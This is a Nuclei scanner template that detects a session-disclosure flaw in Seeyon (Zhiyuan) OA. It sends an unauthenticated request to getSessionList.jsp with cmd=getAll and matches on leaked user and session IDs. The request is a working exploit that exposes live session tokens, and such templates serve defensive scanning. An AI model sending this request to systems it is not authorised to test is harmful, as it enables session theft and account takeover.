id: seeyon-getSessionList-disclosure

info:
  name: 致远 OA getSessionList - disclosure
  author: pikpikcu
  severity: high
  description: A vulnerability in Zhiyuan OA allows remote unauthenticated users access to sensitive session information via the 'getSessionList.jsp' endpoint.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-qeury:
  tags: zhiyuan,leak,disclosure,seeyon,oa

http:
  - raw:
      - |
        GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<usrID>"
          - "<sessionID>"
        condition: and

      - type: status
        status:
          - 200

